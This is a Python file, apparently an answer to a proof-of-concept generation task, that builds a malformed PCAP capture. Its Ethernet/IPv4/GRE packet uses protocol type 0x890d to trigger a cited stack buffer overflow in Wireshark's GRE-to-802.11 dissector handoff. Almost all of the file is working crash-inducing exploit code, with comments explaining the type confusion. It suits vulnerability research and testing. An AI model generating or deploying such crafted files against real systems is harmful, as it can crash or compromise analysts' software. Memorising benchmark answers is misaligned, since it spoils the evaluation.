import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow vulnerability in Wireshark's
        GRE/802.11 dissector interaction (CVE-2016-5350 / Bug 11846).
        
        The vulnerability occurs when the GRE dissector passes its header info as a pseudo-header
        to the 802.11 dissector. The 802.11 dissector expects a specific pseudo-header structure,
        leading to a type confusion where the GRE protocol type is interpreted as part of a length
        field (fcs_len), causing a stack buffer overflow or massive over-read.
        """
        
        # PCAP Global Header
        # Magic: 0xa1b2c3d4 (Little Endian)
        # Version: 2.4
        # LinkType: 1 (Ethernet) - Standard and reliable
        pcap_global = struct.pack(
            "<IHHIIII",
            0xa1b2c3d4, # Magic
            2, 4,       # Version 2.4
            0,          # Zone
            0,          # SigFigs
            65535,      # SnapLen
            1           # LinkType: Ethernet
        )

        # Ethernet Header (14 bytes)
        # Dst: 00:00:00:00:00:00
        # Src: 00:00:00:00:00:00
        # Type: 0x0800 (IPv4)
        eth_header = b'\x00' * 12 + b'\x08\x00'
        
        # IP Header (20 bytes)
        # Ver/IHL: 0x45
        # Total Len: 20 (IP) + 4 (GRE) + 1 (Payload) = 25
        # Proto: 47 (GRE)
        # Src/Dst: 127.0.0.1
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            0x45, 0, 
            25,         # Total Length
            0, 0,       # ID, Flags/Frag
            64,         # TTL
            47,         # Proto: GRE
            0,          # Checksum (0 is accepted)
            b'\x7f\x00\x00\x01', # Src
            b'\x7f\x00\x00\x01'  # Dst
        )
        
        # GRE Header (4 bytes)
        # Flags/Ver: 0x0000 
        # Type: 0x890d (ETHERTYPE_IEEE_802_11)
        # This specific protocol type registers the 802.11 dissector.
        # The 802.11 dissector interprets the GRE header (passed as pseudo-header) 
        # as a ieee_802_11_phdr.
        # On Little Endian systems, fcs_len (int) overlaps with flags and type.
        # fcs_len = flags | (type << 16) = 0 | (0x890d << 16) = 0x890d0000 (Negative huge)
        # This invalid length triggers the overflow/crash.
        gre_header = struct.pack(
            "!HH",
            0x0000,
            0x890d
        )
        
        # Payload (1 byte) - Minimal payload to ensure dissector is called
        payload = b'\x00'
        
        packet_data = eth_header + ip_header + gre_header + payload
        
        # Packet Header
        # Ts Sec, Ts Usec, Incl Len, Orig Len
        pkt_header = struct.pack(
            "<IIII",
            0, 0,
            len(packet_data),
            len(packet_data)
        )
        
        return pcap_global + pkt_header + packet_data